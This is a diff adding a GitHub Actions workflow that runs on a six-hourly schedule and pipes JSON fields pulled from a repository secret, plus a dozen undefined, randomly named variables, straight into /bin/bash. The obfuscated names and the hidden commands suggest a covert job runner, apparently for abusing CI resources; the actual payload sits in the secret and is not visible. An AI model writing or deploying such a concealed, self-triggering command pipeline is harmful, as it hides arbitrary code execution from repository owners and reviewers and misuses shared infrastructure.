@@ -1,0 +1,28 @@
+name: andreilu1
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '42 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: andreilu1
+        env:
+          m452: ${{ secrets.m452 }}
+        run: |
+          echo $m452 | jq -r .ax2 | /bin/bash
+          echo $athq8439 | jq -r .smm9 | /bin/bash
+          echo $kt2 | jq -r .ahya25686 | /bin/bash
+          echo $vedwp263 | jq -r .ryh73058 | /bin/bash
+          echo $klum0 | jq -r .sgfrg01 | /bin/bash
+          echo $koati3 | jq -r .s607 | /bin/bash
+          echo $bqvi38 | jq -r .sa1 | /bin/bash
+          echo $ydyip83108 | jq -r .khdw80 | /bin/bash
+          echo $hrn31136 | jq -r .dbp2 | /bin/bash
+          echo $nlhqf8152 | jq -r .al57 | /bin/bash
+          echo $znmlo600 | jq -r .qhm40147 | /bin/bash
+          echo $trxy2 | jq -r .zuoo00 | /bin/bash
+          echo $yeull8995 | jq -r .pw41594 | /bin/bash
+
